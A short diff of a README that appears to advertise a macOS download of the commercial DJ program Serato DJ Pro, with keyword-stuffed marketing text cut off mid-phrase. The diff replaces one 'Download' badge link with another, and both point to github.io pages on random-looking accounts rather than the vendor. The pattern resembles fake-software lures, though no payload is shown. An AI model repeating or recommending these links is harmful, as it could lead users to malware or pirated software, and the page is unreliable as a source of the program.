@@ -2,7 +2,7 @@
 
 Serato DJ Pro mac on macOS — toolkit focused on pro dj deck interface, plus dvs support and beatgrids & key detect with native integrations and Apple 
 
-[![Download Serato DJ Pro mac](https://img.shields.io/badge/Download-Serato_DJ_Pro_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Serato DJ Pro mac](https://img.shields.io/badge/Download-Serato_DJ_Pro_mac-blueviolet)](https://bruhlashaun1987.github.io/.github/Serato-DJ-Pro)
 
 ---
 
